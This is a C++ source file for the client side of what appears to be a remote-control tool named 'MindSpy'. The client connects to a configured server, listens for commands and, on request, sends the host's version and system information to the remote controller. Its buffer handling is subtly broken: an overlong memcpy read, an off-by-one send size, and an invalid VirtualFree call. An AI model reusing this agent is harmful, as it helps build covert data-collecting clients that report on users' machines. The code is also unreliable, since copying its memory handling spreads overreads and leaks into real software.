#include "Conector.h"

namespace MindSpy
{
	Conector::Conector(string IP, UINT32 Puerto) {
		WSAStartup(MAKEWORD(2, 2), &wsd);
		sckt = socket(AF_INET, SOCK_STREAM, 0);
		server.sin_addr.s_addr = inet_addr(IP.c_str());
		server.sin_family = AF_INET;
		server.sin_port = htons(Puerto);
		Conectado = connect(sckt, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR;
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HiloProc, (LPVOID)this, NULL, NULL);
	}

	Conector::~Conector() {
		closesocket(sckt);
	}

	bool Conector::Listo()
	{
		return Conectado;
	}

	bool Conector::EnviarComando(USHORT SizeofData, USHORT comando, char* Data)
	{
		
		char *DataToSend = (char*)VirtualAlloc(NULL, SizeofData + 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		*(USHORT*)DataToSend = SizeofData + 4;
		*(USHORT*)(DataToSend + 2) = comando;
		memcpy(DataToSend+4, Data, SizeofData + 4);
		bool r = send(sckt, DataToSend, SizeofData+4 + 1, 0) != SOCKET_ERROR;
		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
		return r;
	}

	int Conector::TipoComando(const char*c)
	{
		char Comandos[CANTIDAD_COMANDOS][16] = { "CLOSE", "NAME", "VERSION", "SYSINFO" };
		for (int i = 0; i < CANTIDAD_COMANDOS; i++) {
			if (!strcmp(Comandos[i], c)) return i;
		}
		return COMANDO_NO_EXISTENTE;
	}

	void Conector::Escuchar()
	{
		while (true)
		{
			stringstream str;
			string Comando, Op1, Op2;
			char Mensaje[4096];
			ZeroMemory(Mensaje, sizeof(Mensaje));
			int resp = recv(sckt, Mensaje, sizeof(Mensaje), 0);
			if (resp <= 0)
			{
				Conectado = false;
				break;
			}

			str.clear();
			str << Mensaje;
			str >> Comando;
			str >> Op1;
			getline(str, Op2, '\n');

			for (unsigned int i = 0; i < Comando.length(); i++) {
				Comando[i] = toupper(Comando[i]);
			}

			switch (TipoComando(Comando.c_str()))
			{
			case CLNT_CMDS::VERSION: 
				EnviarComando(strlen(VERSION_CLIENTE) + 1, CLNT_CMDS::VERSION, VERSION_CLIENTE);
				break;

			case CLNT_CMDS::SYSINFO:
				EnviarComando(sizeof(stSystemInfo), CLNT_CMDS::SYSINFO, (char*)&sys.getInfo());
				break;

			case CLNT_CMDS::CLOSE:
				EnviarComando(0, CLNT_CMDS::CLOSE, NULL);
				return;

			case CLNT_CMDS::NAME:
				break;

			}
		}
	}
};